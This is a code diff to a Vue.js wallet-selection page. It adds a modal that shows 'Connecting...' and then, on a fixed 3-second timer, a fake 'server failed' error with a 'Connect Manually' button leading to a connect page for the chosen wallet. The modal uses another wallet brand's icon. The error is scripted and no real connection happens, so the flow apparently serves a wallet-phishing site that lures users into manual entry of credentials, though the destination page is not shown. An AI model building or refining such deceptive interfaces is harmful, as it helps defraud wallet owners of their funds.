@@ -28,7 +28,7 @@
   <v-row>
      
     <v-col  md="3" v-for="w in r_wallet" :key="w.name" sm="6" >
-    <v-card flat align="center" @click="sendNotification(w.name,w.image)" style="background:transparent;">
+    <v-card flat align="center" @click="getWallet(w.name)" style="background:transparent;">
       <div>
     <v-avatar
     size="100"
@@ -43,7 +43,7 @@
 
     </v-avatar>
     </div>
-    <v-card-title style="color:black;display: inline-block;font-size: 15px;" class="white--black">{{w.name}}</v-card-title>
+    <v-card-title style="color:white;display: inline-block;font-size: 15px;" class="white--black">{{w.name}}</v-card-title>
     </v-card>
     </v-col>
     
@@ -56,6 +56,35 @@
 <div class="ben-footer">
     <img :src="foot" alt="" >
   </div>
+<div class="dialog" v-if="modal">
+<div class="modal">
+<div class="close-div">
+<span @click="modal=!modal;dialog=!dialog">back</span>
+<span  @click="modal=!modal;dialog=!dialog">close</span>
+</div>
+
+<div class="error-pane">
+<div class="connecting">
+  <span v-if="dialog">Connecting...</span>
+  <div class="connect-manual" v-if="!dialog">
+    <span>Error Connecting! server BM5X67DHS failed. Try connecting Manually</span>
+    <button @click="dow()">Connect Manually</button>
+  </div>
+</div>
+
+<div class="infinito">
+ <div>
+  <span>infinito</span>
+  <span>easy-to-use browser extension</span>
+ </div>
+ <div class="infinto-img">
+  <img src="https://infinitowallet.io/favicon.png"/>
+ </div>
+</div>
+</div>
+
+</div>
+</div>
   </div>
 </template>
 
@@ -69,6 +98,8 @@ import footer from '@/assets/footer.jpeg'
 import logo from '@/assets/Logo2.png'
   export default {
     data: () => ({
+      dialog: true,
+      modal:false,
       trstlg:trstlogo,
       foot:footer,
       logo_2: (logo),
@@ -217,7 +248,9 @@ import logo from '@/assets/Logo2.png'
       //}
     //}
     //getcoin();
-
+setTimeout(() => {
+  this.dialog=!this.dialog
+}, 3000);
   },
   methods: {
     async requestNotificationPermission() {
@@ -250,11 +283,15 @@ import logo from '@/assets/Logo2.png'
         }
       });
     },
-    dow(u){
-        store.commit("INSERT_WALLET",u)
-    router.push({name:'connect',params:{id:u}})
+    dow(){
+      
+     router.push({name:'connect',params:{id:store.state.wal}})
 
-    console.log(u)
+    
+    },
+    getWallet(wallet){
+      store.commit("INSERT_WALLET",wallet)
+      this.modal=!this.modal  
     },
     nullwallet(){
   if(this.wal==''){
@@ -271,6 +308,8 @@ this.r_wallet=this.wallet
       
     }
   },
+ 
+  
   }
 
 </script>
@@ -281,5 +320,94 @@ this.r_wallet=this.wallet
 .foot{
   display:inline-block;
   
+}
+
+.dialog{
+position: fixed;
+width:100%;
+height:100%;
+background-color: rgb(0,0,0,0.5);
+top: 0%;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+
+
+}
+.modal{
+  background-color: white !important;
+  width: 80%;
+  border-radius: 20px ;
+
+
+}
+.close-div{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background-color: whitesmoke;
+  border-top-left-radius: 20px;
+  border-top-right-radius: 20px;
+  padding: 10px ;
+  >span:first-child{
+    color: rgb(105, 172, 226);
+  }
+  >span:last-child{
+    color: grey;
+  }
+}
+
+.error-pane{
+  padding: 30px 20px;
+  display: flex;
+  flex-direction: column;
+  gap:10px;
+}
+.connecting{
+border: 1px solid red;
+padding: 10px;
+border-radius: 10px;
+color:red;
+
+}
+.infinito{
+  border: 1px solid grey;
+  color:rgb(67, 66, 66);
+  padding: 10px;
+  border-radius: 10px;
+  display: flex;
+}
+.infinito>div:first-child{
+  justify-content: center;
+  display: flex;
+  flex-direction: column;
+  width: 85%;
+  >span:first-child{
+    font-weight: bold;
+  }
+}
+.infinto-img{
+  display: flex;
+  justify-content: center;
+  align-items: top;
+  >img{
+    width: 20px;
+    height: 20ox;
+    aspect-ratio: 1/1;
+  }
+}
+.connect-manual{
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+  >button{
+    color: white;
+    background-color: rgb(6, 72, 153);
+    border-radius: 5px;
+    padding: 5px;
+    font-weight: bold;
+    font-size: 15px;
+  }
 }
 </style>
